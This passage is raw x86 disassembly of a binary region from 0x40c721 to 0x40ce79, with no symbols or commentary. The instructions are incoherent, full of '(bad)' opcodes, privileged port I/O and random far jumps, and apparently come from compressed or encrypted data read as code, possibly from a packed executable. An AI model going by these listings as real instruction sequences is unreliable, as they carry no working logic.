  40c721:	jo     0x40c776
  40c723:	dec    esp
  40c724:	ja     0x40c71d
  40c726:	inc    esp
  40c727:	and    DWORD PTR [eax+0x4e39eecd],0x24
  40c72e:	cdq    
  40c72f:	sar    DWORD PTR [ebx+ebp*1],0x6d
  40c733:	shl    ecx,cl
  40c735:	out    0x1e,eax
  40c737:	js     0x40c731
  40c739:	push   ebx
  40c73a:	loop   0x40c77b
  40c73c:	ja     0x40c772
  40c73e:	shl    BYTE PTR [ebx+esi*1+0x26],0xde
  40c743:	or     BYTE PTR [ecx],0x1f
  40c746:	pop    edi
  40c747:	add    al,0x23
  40c749:	arpl   WORD PTR ss:[ecx],si
  40c74c:	add    bl,0x58
  40c74f:	and    eax,0x8045f371
  40c754:	and    BYTE PTR [edx-0x80],al
  40c757:	pop    ds
  40c758:	dec    eax
  40c759:	sbb    DWORD PTR [edx],esp
  40c75b:	popf   
  40c75c:	out    dx,eax
  40c75d:	mov    al,gs:0x3d839394
  40c763:	imul   edx
  40c765:	xlat   BYTE PTR ds:[ebx]
  40c766:	jns    0x40c783
  40c768:	adc    al,0x6f
  40c76a:	xor    edi,esi
  40c76c:	cmp    eax,0xcae46f98
  40c771:	xchg   esi,eax
  40c772:	jns    0x40c7d9
  40c774:	(bad)  
  40c775:	int3   
  40c776:	pop    ss
  40c777:	outs   dx,BYTE PTR ds:[esi]
  40c778:	sub    BYTE PTR [esi-0x2223e5dc],dh
  40c77e:	add    ah,BYTE PTR [eax-0x3dcbd626]
  40c784:	mov    ss,WORD PTR [esi+0x32]
  40c787:	test   edx,ecx
  40c789:	test   eax,0x751643ad
  40c78e:	js     0x29dfc6d8
  40c794:	sub    esp,DWORD PTR [edx+0x6d85b871]
  40c79a:	mov    eax,gs:0x648bfe67
  40c7a0:	xchg   ebx,eax
  40c7a1:	or     edi,edi
  40c7a3:	push   edx
  40c7a4:	xchg   ebp,eax
  40c7a5:	or     DWORD PTR [ecx+eax*8],esi
  40c7a8:	jo     0x40c7e9
  40c7aa:	push   ebx
  40c7ab:	mov    eax,ds:0xac023696
  40c7b0:	xchg   ebp,eax
  40c7b1:	xchg   ebp,eax
  40c7b2:	popf   
  40c7b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7b4:	add    BYTE PTR [ebp+0x2],0x76
  40c7b8:	xchg   ecx,eax
  40c7b9:	ja     0x40c7e2
  40c7bb:	test   DWORD PTR [eax],ecx
  40c7bd:	xlat   BYTE PTR ds:[ebx]
  40c7be:	shr    BYTE PTR [edi-0x1e],1
  40c7c1:	and    BYTE PTR [esi+ebx*1-0x103d07e8],bl
  40c7c8:	stos   DWORD PTR es:[edi],eax
  40c7c9:	jmp    0xd04:0x96db14a5
  40c7d0:	ins    BYTE PTR es:[edi],dx
  40c7d1:	jae    0x40c828
  40c7d3:	sbb    DWORD PTR [eiz*1+0x4270fd8],edx
  40c7da:	dec    esp
  40c7db:	inc    esi
  40c7dc:	push   dx
  40c7de:	xchg   esp,eax
  40c7df:	mov    ds:0xdf8c4017,eax
  40c7e4:	addr16 ja 0x40c814
  40c7e7:	mov    dh,0xbf
  40c7e9:	mov    bl,0xcb
  40c7eb:	inc    eax
  40c7ec:	in     al,dx
  40c7ed:	iret   
  40c7ee:	sub    ebx,DWORD PTR [edi-0x5a]
  40c7f1:	mov    esp,0x67f4a4b1
  40c7f6:	add    DWORD PTR [esi],edx
  40c7f8:	fst    DWORD PTR [ebx+0xb]
  40c7fb:	popa   
  40c7fc:	fdivr  st(0),st
  40c7fe:	mov    BYTE PTR es:[eax+0x76],al
  40c802:	(bad)  
  40c803:	fist   WORD PTR [ecx+edi*2-0x35fc1404]
  40c80a:	das    
  40c80b:	test   eax,0x5436b572
  40c810:	pop    es
  40c811:	mov    ebp,0xda13767b
  40c816:	test   dh,ah
  40c818:	mov    ds:0x970729a,al
  40c81d:	retf   
  40c81e:	out    0xd7,al
  40c820:	inc    ebp
  40c821:	adc    bl,dh
  40c823:	sahf   
  40c824:	int    0xfb
  40c826:	mov    ebp,0x9b48f7c
  40c82b:	not    BYTE PTR [ebp-0x4f]
  40c82e:	int    0xb5
  40c830:	(bad)  
  40c831:	jnp    0x40c87c
  40c833:	inc    ebp
  40c834:	ret    
  40c835:	and    ch,al
  40c837:	aaa    
  40c838:	pop    es
  40c839:	aaa    
  40c83a:	call   0x36b5:0xbb98c2b1
  40c841:	mov    BYTE PTR [edi],bl
  40c843:	pop    ss
  40c844:	pusha  
  40c845:	fistp  WORD PTR [ecx+esi*2]
  40c848:	(bad)  
  40c849:	shl    BYTE PTR [ebx-0x1c588ad0],cl
  40c84f:	and    cl,bl
  40c851:	and    eax,ebx
  40c853:	mov    esp,0xb4ca71e2
  40c858:	ret    0x6d3f
  40c85b:	sar    DWORD PTR [esi+0x4ca8c13],1
  40c861:	loop   0x40c82e
  40c863:	mov    ecx,0xc4ba620c
  40c868:	stos   DWORD PTR es:[edi],eax
  40c869:	repz sahf 
  40c86b:	ret    0x611
  40c86e:	ins    DWORD PTR es:[edi],dx
  40c86f:	stos   DWORD PTR es:[edi],eax
  40c870:	push   cs
  40c871:	ret    
  40c872:	xchg   esp,eax
  40c873:	or     eax,0x53891b24
  40c878:	sbb    BYTE PTR [edi+0x454a8126],cl
  40c87e:	stc    
  40c87f:	add    dl,cl
  40c881:	or     BYTE PTR [eax+0x75],ch
  40c884:	mov    eax,ds:0x62111579
  40c889:	(bad)  
  40c88a:	lds    edx,FWORD PTR [ebp+0x53]
  40c88d:	mov    WORD PTR [bp+si],?
  40c890:	sbb    ch,BYTE PTR [edi]
  40c892:	aas    
  40c893:	ret    0x1f60
  40c896:	cmp    BYTE PTR [edi+0x51db5a39],bh
  40c89c:	aad    0xee
  40c89e:	push   edi
  40c89f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8a0:	mov    ecx,0x252c7927
  40c8a5:	test   DWORD PTR [eax-0x1e],ebp
  40c8a8:	jno    0x40c842
  40c8aa:	int    0x7f
  40c8ac:	(bad)  
  40c8ad:	adc    al,0xfd
  40c8af:	xchg   edx,eax
  40c8b0:	sbb    edi,DWORD PTR [ebx+ebp*8]
  40c8b3:	or     eax,0x68488257
  40c8b8:	into   
  40c8b9:	inc    esi
  40c8ba:	icebp  
  40c8bb:	les    edi,FWORD PTR [edx]
  40c8bd:	jle    0x40c8ed
  40c8bf:	or     eax,0x8e8cfdbf
  40c8c4:	inc    ebx
  40c8c5:	test   eax,0xf6a09718
  40c8ca:	daa    
  40c8cb:	push   cs
  40c8cc:	and    BYTE PTR [ecx+0x714509cb],cl
  40c8d2:	pop    ss
  40c8d3:	popa   
  40c8d4:	into   
  40c8d5:	mov    esi,0x6e078f32
  40c8da:	mov    esi,DWORD PTR [edi-0x7584d841]
  40c8e0:	cwde   
  40c8e1:	pop    es
  40c8e2:	jno    0x40c875
  40c8e4:	pop    ebp
  40c8e5:	mov    dh,0xf4
  40c8e7:	(bad)  
  40c8e8:	mov    edx,0xae307e84
  40c8ed:	mov    bl,0x79
  40c8ef:	sub    bl,cl
  40c8f1:	gs hlt 
  40c8f3:	ds inc edx
  40c8f5:	sub    ebp,DWORD PTR [edx-0x54750b66]
  40c8fb:	aad    0xc8
  40c8fd:	push   0xffffffd5
  40c8ff:	imul   ebx,DWORD PTR [edx],0xb
  40c902:	pop    ebp
  40c903:	or     al,dh
  40c905:	cmp    eax,0x8e229828
  40c90a:	adc    edx,DWORD PTR ds:0xb001c3d
  40c910:	dec    esi
  40c912:	mov    eax,ds:0xb676384b
  40c917:	outs   dx,DWORD PTR ds:[esi]
  40c918:	mov    ebp,0xfca60157
  40c91d:	cmp    eax,0xb818e602
  40c922:	div    BYTE PTR [ecx-0x20]
  40c925:	gs scas eax,DWORD PTR es:[edi]
  40c927:	sbb    al,al
  40c929:	add    eax,0x1938a368
  40c92e:	jecxz  0x40c983
  40c930:	shl    DWORD PTR [ebp+0x7d],cl
  40c933:	hlt    
  40c934:	pop    ebx
  40c935:	mov    bh,0xdc
  40c937:	mov    dl,0xa9
  40c939:	ret    
  40c93a:	in     eax,dx
  40c93b:	int    0xd0
  40c93d:	mov    bl,0xf8
  40c93f:	mov    dl,0x80
  40c941:	rcr    DWORD PTR [ebx+0x47564e24],1
  40c947:	inc    edx
  40c948:	int3   
  40c949:	xor    al,0xd
  40c94b:	mov    bl,0x75
  40c94d:	adc    al,0x1f
  40c94f:	(bad)  
  40c950:	cwde   
  40c951:	retf   
  40c952:	xchg   esp,eax
  40c953:	jge    0x40c8e5
  40c955:	ins    DWORD PTR es:[edi],dx
  40c956:	(bad)  
  40c957:	jnp    0x40c958
  40c959:	rcl    BYTE PTR [ebp-0x45354952],0xbe
  40c960:	dec    edx
  40c961:	sti    
  40c962:	mov    ch,0x42
  40c964:	bound  ecx,QWORD PTR [esi-0x1b55b65d]
  40c96a:	push   ss
  40c96b:	out    0x58,al
  40c96d:	or     dl,dl
  40c96f:	pusha  
  40c970:	push   0xffffffc3
  40c972:	std    
  40c973:	xor    ecx,DWORD PTR [edi+0x57]
  40c976:	push   cs
  40c977:	jns    0x40c90c
  40c979:	inc    edx
  40c97a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c97b:	mov    esi,0x11a35291
  40c980:	push   ss
  40c981:	mov    BYTE PTR [ebx+0x1745eee3],ah
  40c987:	fxtract 
  40c989:	lods   al,BYTE PTR ds:[esi]
  40c98a:	cdq    
  40c98b:	iret   
  40c98c:	xchg   esp,eax
  40c98d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c98e:	test   al,0xd0
  40c990:	sahf   
  40c991:	adc    BYTE PTR [eax-0x6fe29d2c],0xf7
  40c998:	(bad)  
  40c999:	jmp    0x131eedf0
  40c99e:	gs jge 0x40c9b7
  40c9a1:	popf   
  40c9a2:	cmc    
  40c9a3:	xor    al,0x1
  40c9a5:	fist   WORD PTR [eax-0x64bca5b2]
  40c9ab:	dec    ebx
  40c9ac:	test   eax,0xea47e72
  40c9b1:	push   ebp
  40c9b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9b3:	les    esi,FWORD PTR [ecx]
  40c9b5:	pop    esp
  40c9b6:	fisubr DWORD PTR [edx-0x266dabdc]
  40c9bc:	imul   BYTE PTR [ecx+0x1a]
  40c9bf:	shl    BYTE PTR [esi+0x54],cl
  40c9c2:	sbb    esi,ebx
  40c9c4:	and    al,0xf1
  40c9c6:	sbb    ebp,0x54
  40c9c9:	mov    edx,0x70266a1a
  40c9ce:	pusha  
  40c9cf:	popa   
  40c9d0:	out    dx,al
  40c9d1:	or     edi,eax
  40c9d3:	mov    esp,ebx
  40c9d5:	xchg   ecx,eax
  40c9d6:	adc    eax,0x3d39b9bb
  40c9db:	jmp    0xbcaa:0xfdd64224
  40c9e2:	jecxz  0x40ca27
  40c9e4:	ins    DWORD PTR es:[edi],dx
  40c9e5:	xor    eax,0x34886adf
  40c9ea:	pop    ebx
  40c9eb:	cmp    eax,0xc8f6b9ad
  40c9f0:	test   al,0x54
  40c9f2:	shl    al,cl
  40c9f4:	pusha  
  40c9f5:	repz lock inc ecx
  40c9f8:	clc    
  40c9f9:	mov    al,0xe6
  40c9fb:	aas    
  40c9fc:	cdq    
  40c9fd:	adc    al,0x5c
  40c9ff:	adc    DWORD PTR [esi],0x53ae55fb
  40ca05:	pusha  
  40ca06:	pop    ebp
  40ca07:	push   ebp
  40ca08:	cmp    bl,BYTE PTR [edx]
  40ca0a:	out    0xe1,al
  40ca0c:	test   eax,0x808d6f7
  40ca11:	jne    0x40c9db
  40ca13:	fcmovne st,st(4)
  40ca15:	loop   0x40ca1e
  40ca17:	xchg   edx,eax
  40ca18:	imul   edx,DWORD PTR [ecx+edx*1-0x4d],0x4086ee18
  40ca20:	mov    dl,0xd6
  40ca22:	dec    edi
  40ca23:	lahf   
  40ca24:	ja     0x40ca97
  40ca26:	mov    ah,0xb0
  40ca28:	gs adc eax,0xe2f74dac
  40ca2e:	mov    bh,0x2f
  40ca30:	and    BYTE PTR [edi],al
  40ca32:	in     al,dx
  40ca33:	pop    ecx
  40ca34:	test   BYTE PTR [esi],bl
  40ca36:	or     ah,BYTE PTR [ecx+ebp*2-0x7c]
  40ca3a:	or     edi,DWORD PTR [ecx]
  40ca3c:	nop
  40ca3d:	cmp    DWORD PTR [eax+0x3b55efef],ebx
  40ca43:	leave  
  40ca44:	aam    0xa3
  40ca46:	out    dx,al
  40ca47:	idiv   ecx
  40ca49:	sub    ch,BYTE PTR [esp+edx*4]
  40ca4c:	lock xchg esi,eax
  40ca4e:	adc    bh,BYTE PTR [eax-0x20]
  40ca51:	inc    ebp
  40ca52:	xchg   ebp,eax
  40ca53:	push   ds
  40ca54:	adc    al,BYTE PTR ds:0xa42212d8
  40ca5a:	inc    ecx
  40ca5b:	jo     0x40ca1b
  40ca5d:	dec    ebx
  40ca5e:	(bad)  
  40ca5f:	adc    ch,BYTE PTR [esi]
  40ca61:	lds    ebp,FWORD PTR [edx]
  40ca63:	mov    gs,WORD PTR ss:[eax+edx*2+0x35326d5b]
  40ca6b:	jp     0x40ca79
  40ca6d:	fs call 0x8d1b6b94
  40ca73:	push   es
  40ca74:	int3   
  40ca75:	and    al,0x2c
  40ca77:	mov    ecx,0x22796164
  40ca7c:	std    
  40ca7d:	icebp  
  40ca7e:	add    dl,BYTE PTR [ecx+ebx*4-0x6f]
  40ca82:	push   esp
  40ca83:	arpl   ax,dx
  40ca85:	jmp    0x8a3f5701
  40ca8a:	or     ch,BYTE PTR [esi+0x2eb5ecbe]
  40ca90:	pop    edx
  40ca91:	xchg   DWORD PTR [ecx+0x2],edi
  40ca94:	fimul  DWORD PTR [ebp-0x6b]
  40ca97:	cmp    eax,0xae939b0
  40ca9c:	sub    ebp,DWORD PTR [edx-0x39]
  40ca9f:	jg     0x40cac7
  40caa1:	div    BYTE PTR [esi]
  40caa3:	inc    ebp
  40caa4:	dec    eax
  40caa5:	call   0x1569:0x91d45948
  40caac:	jns    0x40ca7d
  40caae:	outs   dx,DWORD PTR ds:[esi]
  40caaf:	inc    ebx
  40cab0:	fwait
  40cab1:	dec    eax
  40cab2:	ins    BYTE PTR es:[edi],dx
  40cab3:	leave  
  40cab4:	mov    al,0x99
  40cab6:	in     al,0xfa
  40cab8:	jmp    0x7b7b:0xd946c827
  40cabf:	repnz push 0x3733693
  40cac5:	pop    esi
  40cac6:	cwde   
  40cac7:	xor    bl,0xae
  40caca:	and    BYTE PTR [eax-0x7968e8a6],cl
  40cad0:	push   ss
  40cad1:	test   al,0xe6
  40cad3:	cmp    al,bh
  40cad5:	sbb    esi,esp
  40cad7:	je     0x40cb0b
  40cad9:	cmp    eax,DWORD PTR [edx]
  40cadb:	mov    ebp,0xe8e8327f
  40cae0:	inc    eax
  40cae1:	pop    ss
  40cae2:	(bad)  
  40cae3:	les    esi,FWORD PTR [edi+0x3e]
  40cae6:	push   ds
  40cae7:	pop    es
  40cae8:	xor    al,0xb5
  40caea:	jae    0x40cab0
  40caec:	cmc    
  40caed:	adc    eax,0xa3d98a99
  40caf2:	dec    eax
  40caf3:	outs   dx,DWORD PTR ds:[esi]
  40caf4:	ss sti 
  40caf6:	fcom   QWORD PTR ds:[ebx+0x4597589]
  40cafd:	push   ecx
  40cafe:	sub    BYTE PTR [edi-0x8],0x64
  40cb02:	test   BYTE PTR [edi*8-0x5b522aa5],0xd
  40cb0a:	pop    esi
  40cb0b:	sbb    DWORD PTR [ebx-0x179c58ed],0x4aab11d3
  40cb15:	mov    ebp,0x52f56050
  40cb1a:	(bad)  
  40cb1c:	mov    esi,ds
  40cb1e:	cmp    al,0xf
  40cb20:	scas   eax,DWORD PTR es:[edi]
  40cb21:	pop    eax
  40cb22:	and    eax,0x2a69019e
  40cb27:	mov    al,0x4f
  40cb29:	jmp    0x9a17:0xdf6f19e
  40cb30:	push   0xf9a3b4d5
  40cb35:	lea    ecx,[ebp-0x64200c28]
  40cb3b:	xor    ch,ch
  40cb3d:	out    0x57,al
  40cb3f:	mov    al,ds:0x9630b43
  40cb44:	fist   DWORD PTR [ecx]
  40cb46:	adc    al,0x1a
  40cb48:	inc    ebx
  40cb49:	or     DWORD PTR [edx-0x6b],0x4107c475
  40cb50:	sub    DWORD PTR ds:0xce33d87b,ebx
  40cb56:	push   eax
  40cb57:	sahf   
  40cb58:	push   0x428fa52c
  40cb5d:	mov    al,ds:0xf9c84c1c
  40cb62:	jns    0x40cba4
  40cb64:	push   ebp
  40cb65:	outs   dx,BYTE PTR cs:[esi]
  40cb67:	ja     0x40caec
  40cb69:	and    BYTE PTR [edi],bh
  40cb6b:	dec    ebx
  40cb6c:	pop    edi
  40cb6d:	sub    DWORD PTR [ebx+0x13],esp
  40cb70:	nop
  40cb71:	xor    BYTE PTR [eax-0x11],0x4f
  40cb75:	push   ecx
  40cb76:	inc    ebx
  40cb77:	inc    esp
  40cb78:	mov    WORD PTR [ecx+0x76],es
  40cb7b:	call   0x93e9896d
  40cb80:	inc    edi
  40cb81:	iret   
  40cb82:	(bad)
  40cb85:	pushf  
  40cb86:	mov    eax,edx
  40cb88:	adc    edx,eax
  40cb8a:	mov    BYTE PTR [ebx],0xa3
  40cb8d:	jns    0x40cb4a
  40cb8f:	add    DWORD PTR [ebx],edi
  40cb91:	inc    edi
  40cb92:	sti    
  40cb93:	or     al,0x33
  40cb95:	dec    esp
  40cb96:	jnp    0x40cbca
  40cb98:	into   
  40cb99:	jns    0x40cbb0
  40cb9b:	jmp    DWORD PTR fs:[edi]
  40cb9e:	add    bl,BYTE PTR [eax]
  40cba0:	je     0x40cba2
  40cba2:	jecxz  0x40cb57
  40cba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cba5:	retf   
  40cba6:	into   
  40cba7:	mov    bl,0x6b
  40cba9:	mov    ecx,0xdfec5aac
  40cbae:	loop   0x40cbfe
  40cbb0:	dec    BYTE PTR [edx+0x23]
  40cbb3:	xor    DWORD PTR [esi+0x30],0xffffffc8
  40cbb7:	sbb    DWORD PTR [ecx],0xfffffffe
  40cbba:	inc    esi
  40cbbb:	mov    bl,0x57
  40cbbd:	rol    DWORD PTR [edx],cl
  40cbbf:	pop    ebp
  40cbc0:	add    DWORD PTR [edi+0x2ac21ab2],0xdb6fdb25
  40cbca:	inc    ecx
  40cbcb:	push   ecx
  40cbcc:	mov    ecx,0xfe155c3
  40cbd1:	or     eax,0x4e3585bf
  40cbd6:	jbe    0x40cc04
  40cbd8:	aas    
  40cbd9:	mov    esp,0xd62eb4ae
  40cbde:	mov    WORD PTR [ebx],ds
  40cbe0:	(bad)  
  40cbe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbe2:	call   0x2dcfc785
  40cbe7:	mov    dl,0xed
  40cbe9:	cmc    
  40cbea:	push   es
  40cbeb:	ja     0x40cbb0
  40cbed:	icebp  
  40cbee:	out    dx,eax
  40cbef:	pop    edx
  40cbf0:	inc    edx
  40cbf1:	adc    eax,0xc6bdc597
  40cbf6:	or     al,0x60
  40cbf8:	int3   
  40cbf9:	mov    ah,0x19
  40cbfb:	test   BYTE PTR [edi],bh
  40cbfd:	ins    DWORD PTR es:[edi],dx
  40cbfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbff:	and    bl,BYTE PTR [ecx-0x16]
  40cc02:	add    bh,al
  40cc04:	adc    ebp,eax
  40cc06:	leave  
  40cc07:	and    eax,0x5286e0d2
  40cc0c:	push   esi
  40cc0d:	enter  0x3d9f,0xc7
  40cc11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc12:	ret    
  40cc13:	mov    eax,0x72a8bc6f
  40cc18:	jge    0x40cbcb
  40cc1a:	mov    bl,0x1c
  40cc1c:	mov    eax,0xb8d6cb06
  40cc21:	inc    edi
  40cc22:	or     BYTE PTR [ecx],al
  40cc24:	arpl   bx,dx
  40cc26:	cmp    al,0x56
  40cc28:	fcmovne st,st(5)
  40cc2a:	xchg   ecx,eax
  40cc2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc2c:	mov    DWORD PTR [ebp-0x4],eax
  40cc2f:	dec    ebx
  40cc30:	add    eax,0xae85b6a3
  40cc35:	jmp    0x45aa:0x83d5a34b
  40cc3c:	in     eax,dx
  40cc3d:	out    0xa9,eax
  40cc3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc40:	xchg   ebp,eax
  40cc41:	push   ecx
  40cc42:	xchg   edx,eax
  40cc43:	mov    cl,0x5c
  40cc45:	ss cdq 
  40cc47:	mov    esp,0x14cc8c07
  40cc4c:	mov    dh,0x4
  40cc4e:	loop   0x40cc1d
  40cc50:	(bad)  
  40cc51:	lods   eax,DWORD PTR ds:[esi]
  40cc52:	mov    ebp,0x6b527791
  40cc57:	xchg   BYTE PTR [ecx],ch
  40cc59:	mov    bh,0xc2
  40cc5b:	fnstsw WORD PTR fs:[ebx-0x5791f07e]
  40cc62:	sbb    al,0x2c
  40cc64:	psrlw  mm5,QWORD PTR [edx]
  40cc67:	add    dl,dl
  40cc69:	in     eax,0xc2
  40cc6b:	aaa    
  40cc6c:	dec    ebx
  40cc6d:	mov    esi,0x78323f0e
  40cc72:	test   DWORD PTR [esi+0x55603287],esi
  40cc78:	out    0x86,al
  40cc7a:	in     al,dx
  40cc7b:	stos   DWORD PTR es:[edi],eax
  40cc7c:	int3   
  40cc7d:	pop    edx
  40cc7e:	jne    0x40ccbb
  40cc80:	or     eax,0x59e8af67
  40cc85:	imul   ebp,edi,0x1e
  40cc88:	add    al,0xf8
  40cc8a:	ret    
  40cc8b:	std    
  40cc8c:	out    0x6c,al
  40cc8e:	in     al,dx
  40cc8f:	cwde   
  40cc90:	in     al,0x28
  40cc92:	jp     0x40cc76
  40cc94:	shl    BYTE PTR [edi-0x5f],1
  40cc97:	loope  0x40ccd6
  40cc99:	icebp  
  40cc9a:	cmp    dl,dh
  40cc9c:	jne    0x40cc4a
  40cc9e:	add    BYTE PTR [edi],bl
  40cca0:	xchg   ecx,eax
  40cca1:	push   es
  40cca2:	mov    bl,0xf8
  40cca4:	xlat   BYTE PTR ds:[ebx]
  40cca5:	ins    DWORD PTR es:[edi],dx
  40cca6:	dec    esp
  40cca7:	nop
  40cca8:	jae    0x40ccd1
  40ccaa:	neg    DWORD PTR [esi+ebx*1-0x2789f04e]
  40ccb1:	adc    eax,0x73bf63d0
  40ccb6:	cmp    BYTE PTR [edx],0x36
  40ccb9:	mov    al,0x4e
  40ccbb:	mov    ecx,0xce3213e7
  40ccc0:	(bad)  
  40ccc1:	mov    eax,DWORD PTR [edi-0x49c51ed3]
  40ccc7:	pop    ebp
  40ccc8:	rcl    ebp,0x7a
  40cccb:	sar    BYTE PTR ds:0x3368bb00,1
  40ccd1:	cmp    ah,BYTE PTR cs:[ebx-0x51]
  40ccd5:	sub    BYTE PTR [esi+0xb],ah
  40ccd8:	mov    ebp,0x4a0378b1
  40ccdd:	xchg   edx,eax
  40ccde:	push   edi
  40ccdf:	jecxz  0x40ccea
  40cce1:	jo     0x40ccae
  40cce3:	into   
  40cce4:	xchg   ch,cl
  40cce6:	and    eax,0x239e4cd0
  40cceb:	in     eax,0x68
  40cced:	div    dl
  40ccef:	sar    BYTE PTR [eax-0x33edb820],1
  40ccf5:	push   esp
  40ccf6:	imul   edx,DWORD PTR [ebx-0x842d7dd],0x14
  40ccfd:	mov    ecx,0x90e50bc2
  40cd02:	sub    DWORD PTR [edx],0xffffffee
  40cd05:	jne    0x40cd72
  40cd07:	dec    esi
  40cd08:	pusha  
  40cd09:	jne    0x40cce7
  40cd0b:	jmp    0x4818:0xea88a67f
  40cd12:	sbb    al,0x69
  40cd14:	push   ds
  40cd15:	push   ds
  40cd16:	cmp    DWORD PTR [edx-0x7233f3e4],ecx
  40cd1c:	pop    esi
  40cd1d:	pop    edx
  40cd1e:	adc    al,0xbe
  40cd20:	neg    DWORD PTR [edx-0x81af7ab]
  40cd26:	sbb    ebx,ecx
  40cd28:	and    eax,0xc30d5517
  40cd2d:	pop    ebx
  40cd2e:	sti    
  40cd2f:	mov    ah,al
  40cd31:	pop    ebp
  40cd32:	ss call 0x7973d14d
  40cd38:	loopne 0x40cd6d
  40cd3a:	xchg   esp,eax
  40cd3b:	inc    ecx
  40cd3c:	xchg   edi,eax
  40cd3d:	or     eax,0x7487b44f
  40cd42:	inc    ecx
  40cd43:	hlt    
  40cd44:	ins    DWORD PTR es:[edi],dx
  40cd45:	push   ds
  40cd46:	dec    eax
  40cd48:	mov    dh,0xe7
  40cd4a:	aaa    
  40cd4b:	ins    BYTE PTR es:[edi],dx
  40cd4c:	mov    ch,0xad
  40cd4e:	ins    BYTE PTR es:[edi],dx
  40cd4f:	mov    ebx,0x77320fec
  40cd54:	or     eax,0x79835f25
  40cd59:	mov    WORD PTR [ebx],gs
  40cd5b:	inc    ebp
  40cd5c:	in     al,0x82
  40cd5e:	ins    DWORD PTR es:[edi],dx
  40cd5f:	sub    al,0xd4
  40cd61:	mov    WORD PTR [edi],cs
  40cd63:	sub    esi,DWORD PTR [esi+0x22a9c234]
  40cd69:	pandn  mm1,QWORD PTR [ecx-0x1d]
  40cd6d:	xchg   esi,eax
  40cd6e:	leave  
  40cd6f:	push   cs
  40cd70:	popf   
  40cd71:	xchg   ecx,eax
  40cd72:	mov    cl,BYTE PTR ds:0xb2ca8dc0
  40cd78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd79:	cs pop edx
  40cd7b:	lahf   
  40cd7c:	mov    ebx,0xb45d18b6
  40cd81:	cwde   
  40cd82:	daa    
  40cd83:	out    0x67,eax
  40cd85:	sar    DWORD PTR [esp+eiz*8-0xfd927c6],1
  40cd8c:	mov    ds:0xb1c4a050,al
  40cd91:	hlt    
  40cd92:	in     eax,0xe0
  40cd94:	xchg   edx,eax
  40cd95:	mov    cl,0x14
  40cd97:	pop    edx
  40cd98:	icebp  
  40cd99:	cdq    
  40cd9a:	pop    edi
  40cd9b:	jno    0x40cd77
  40cd9d:	pop    edi
  40cd9e:	retf   0xf22c
  40cda1:	and    bh,BYTE PTR [ecx+ecx*1]
  40cda4:	stc    
  40cda5:	leave  
  40cda6:	stc    
  40cda7:	in     eax,0xd3
  40cda9:	pop    ds
  40cdaa:	arpl   WORD PTR [ebp-0x58],dx
  40cdad:	cwde   
  40cdae:	pop    esp
  40cdaf:	dec    bp
  40cdb1:	xor    DWORD PTR [esi+0x6a1a4002],eax
  40cdb7:	enter  0x28d0,0xb9
  40cdbb:	add    eax,0x1b1b6983
  40cdc0:	clc    
  40cdc1:	pop    ebx
  40cdc2:	dec    ebx
  40cdc3:	lods   al,BYTE PTR ds:[esi]
  40cdc4:	xor    BYTE PTR [edx-0x196f8399],0x63
  40cdcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdcc:	push   esi
  40cdcd:	out    0xce,al
  40cdcf:	fnstenv [edx+0x58]
  40cdd2:	cmp    bh,al
  40cdd4:	mov    WORD PTR [ebx+0x67cf7c83],ss
  40cdda:	data16 fcomp QWORD PTR [ebp+0x1c]
  40cdde:	loop   0x40ce03
  40cde0:	dec    edx
  40cde1:	inc    ebp
  40cde2:	xor    esp,DWORD PTR [ecx-0x7441d1b1]
  40cde8:	xchg   ebp,eax
  40cde9:	jecxz  0x40cd8d
  40cdeb:	out    0x3d,eax
  40cded:	jo     0x40ce0f
  40cdef:	popa   
  40cdf0:	sbb    ch,BYTE PTR [edi-0x36d6d39f]
  40cdf6:	xor    BYTE PTR [edi],cl
  40cdf8:	xor    bh,cl
  40cdfa:	xor    DWORD PTR [eax-0x28572471],ecx
  40ce00:	add    esi,DWORD PTR [esi+0x26994b4d]
  40ce06:	adc    al,0x1d
  40ce08:	test   DWORD PTR [eax+0x4fd5ed44],ebx
  40ce0e:	js     0x40cdd1
  40ce10:	clc    
  40ce11:	jnp    0x40cdd8
  40ce13:	fst    st(4)
  40ce15:	ja     0x40ce75
  40ce17:	daa    
  40ce18:	xchg   edx,eax
  40ce19:	pushf  
  40ce1a:	and    eax,0x32b73e01
  40ce1f:	or     bl,BYTE PTR [edx-0x5b0b68cd]
  40ce25:	pop    ebp
  40ce26:	ret    0x7e7
  40ce29:	and    eax,0x50e5525e
  40ce2e:	mov    al,ds:0x4a6cf3df
  40ce33:	rcr    DWORD PTR [edx+eax*4-0x28],0x5e
  40ce38:	sbb    dl,dh
  40ce3a:	out    0x73,eax
  40ce3c:	neg    DWORD PTR [ecx-0x40ee9e6f]
  40ce42:	arpl   WORD PTR [esi],ax
  40ce44:	cmp    BYTE PTR [edi+0x10],dh
  40ce47:	dec    ebx
  40ce48:	xchg   edx,eax
  40ce49:	add    bh,BYTE PTR [eax+0x2e6fcbb5]
  40ce4f:	dec    edi
  40ce50:	or     edx,DWORD PTR [edx]
  40ce52:	xlat   BYTE PTR ds:[ebx]
  40ce53:	adc    ecx,DWORD PTR [ebx-0x46]
  40ce56:	sbb    ah,0x5f
  40ce59:	loope  0x40cec7
  40ce5b:	pop    ds
  40ce5c:	loopne 0x40ce11
  40ce5e:	pop    esp
  40ce5f:	inc    esp
  40ce60:	scas   al,BYTE PTR es:[edi]
  40ce61:	pop    eax
  40ce62:	xchg   esp,eax
  40ce63:	shl    DWORD PTR [edx-0x73],0x70
  40ce67:	xchg   ecx,eax
  40ce68:	jl     0x40ce9d
  40ce6a:	dec    ebx
  40ce6b:	ss cdq 
  40ce6d:	test   ebx,eax
  40ce6f:	shr    BYTE PTR [edi],1
  40ce71:	xor    BYTE PTR [esp+ebp*1],0x1b
  40ce75:	adc    esi,0x7c
  40ce78:	aaa    
  40ce79:	pop    ebp
